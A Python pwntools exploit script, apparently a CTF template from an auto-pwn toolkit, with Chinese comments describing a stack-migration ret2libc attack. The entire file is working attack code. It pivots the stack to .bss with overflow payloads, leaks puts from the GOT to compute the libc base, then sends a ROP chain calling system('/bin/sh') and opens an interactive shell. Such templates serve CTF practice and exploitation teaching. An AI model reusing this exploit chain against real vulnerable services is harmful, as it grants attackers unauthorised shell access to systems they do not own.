#encoding=utf-8
#开始生成栈迁移模板file:///home/ctf/Desktop/pwn/HRP-Nnepnep-auto-pwn/AUTO-PWN/local_use/HRP-FUZZ-2.0.py

#canary涉及相关的逻辑操作，若有canary请自己泄露
#ubuntu-18 ret2libc system or orw
from pwn import *
context(log_level='debug',arch='amd64')
elf=ELF('./pwn')
libc=elf.libc
r=process('./pwn')

#gdb.attach(r)

r.recv(timeout=1)

rdi=0x400773
rdx=next(libc.search(asm('pop rdx;ret')))
pop_rsi_r15_ret=0x400771
ret=0x400506
Hierarchical=0x4006b0
Stack_migration_address=0x4006c4
bss=0x601510
offset=0x30
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
payload=b'a'*0x30+p64(bss+0x300)+p64(Stack_migration_address)
r.send(payload)
sleep(1)
payload=b'a'*0x30+p64(bss+0x300+offset)+p64(Stack_migration_address)
r.send(payload)
sleep(1)
payload2=p64(bss+0x300+offset+0x10)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(Stack_migration_address)
r.send(payload2)
sleep(1)
#leak=u64(r.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
leak = u64(r.recv(6).ljust(8, b'\x00'))
base=leak-libc.sym['puts']
print('[+]base:'+hex(base))


#gdb.attach(r)


libc.address = base
ret_address = libc.address + 0x29139
payload3=p64(0)*4+p64(rdi)+p64(next(libc.search(b'/bin/sh\x00')))+p64(libc.sym['system'])
r.send(payload3)
r.sendline('sh;')
r.interactive()
